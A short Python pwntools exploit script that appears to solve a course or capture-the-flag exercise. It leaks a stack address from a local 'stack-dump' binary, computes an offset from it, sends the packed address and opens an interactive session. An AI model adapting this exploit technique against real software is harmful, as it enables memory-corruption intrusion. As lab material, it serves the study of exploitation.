from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32

p = process("../6447/stack-dump")
line = p.recvuntil("stack pointer ")
pause()
num_found = p.recv(10) # EBP - 0x6d, +(0x71-0x04)
print(num_found)
num_found_as_int = int(num_found, base=16)
target_address = num_found_as_int + (0x71-0x04)

p.recvuntil("d) quit\n")

p.sendline("a")
p.recvuntil("len: ")
p.sendline(str(len(pack(target_address, 32))))
p.sendline(pack(target_address, 32))
p.interactive()